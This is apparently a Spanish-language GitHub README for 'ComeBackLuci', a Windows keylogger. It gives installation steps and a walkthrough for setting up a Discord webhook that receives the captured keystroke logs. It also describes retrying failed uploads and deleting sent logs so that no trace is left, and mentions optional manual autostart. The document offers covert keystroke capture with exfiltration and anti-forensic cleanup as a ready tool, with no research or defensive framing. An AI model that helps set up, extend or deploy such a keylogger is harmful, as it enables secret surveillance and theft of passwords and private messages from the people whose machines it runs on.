<h1 align="center">ComeBackLuci v1.0</h1>

## Tabla de contenidos

- [Descripcion](#descripcion)
- [Instalacion](#instalacion)
- [Uso](#uso)
- [Detalles](#detalles)

## Descripcion

ComeBackLuci es un simple keylogger que guarda un registro de las teclas que presiones en la <a href="https://learn.microsoft.com/en-us/dotnet/api/system.io.path.gettemppath?view=net-8.0&tabs=windows">carpeta temporal del sistema(temp)</a> y hara uso de <a href="https://support.discord.com/hc/es/articles/228383668-Introducci%C3%B3n-a-los-webhook">webhooks de discord</a> para enviarte los registros a tu canal de texto preferido

## Instalacion

#### Clona este repositorio

```
git clone https://github.com/razeleakers/ComeBackLuci.git

```

#### Dependencias

Ve a herramientas -> Administrador de paquetes NuGet -> Consola de administrador de paquetes

```
Update-Package -Reinstall

```

## Uso

[1] Para este ejemplo hare uso del instalador predeterminado de visual studio

[1.1] Despues que el instalador se haya creado le dare click a "setup.exe"

<img src="/images/download.png" alt="download">

[2] La primera vez que se ejecute el programa al instalarlo, se le solicitara el enlace de un webhook de discord, esto servira para enviar los registros al canal de texto que quieras

<i>-Si cierras la ventana o ingresas un webhook invalido/expirado el programa no enviara a ningun lugar los registros, sin embargo se seguiran guardando en el sistema los archivos</i>

<img src="/images/install.png" alt="install">

[3] Debes dirigirte a un servidor de discord, crear un webhook y copiar el link

<img src="/images/create.png" alt="create">

[4] Vuelve a la ventana emergente -> pega el link del webhook que creaste -> dale click a "check" para verificar si funciona el envio de mensajes

<img src="/images/sample.png" alt="sample">

[5] Finalmente le das click a "Save and close"

# Detalles

[1] El programa no tiene inicio automatico(startup) por seguridad, asi que tendras que hacerlo manualmente si quieres que cada vez que se apage y prenda el sistema se envien los registros

[2] En caso configures el inicio automatico:

[2.1] El programa enviara los registros como este ejemplo:

<img src="/images/ok.png" alt="ok">

[2.2] Si hubo algun tipo de problema al enviar el archivo(conexion por ejemplo), los registros que no se envien se moveran a una carpeta especial llamada "ErrorFiles", en caso ya vuelva estar disponible el envio de archivos, se comprimira la carpeta "ErrorFiles" y se enviara como este ejemplo:

<img src="/images/error.png" alt="error">

Advertencia!!!: Todos los archivos que se terminen enviando, el programa los eliminara de tu sistema para no dejar rastro de los registros anteriores

##

<h4 align="center">Created by M3RFR3T</h1>
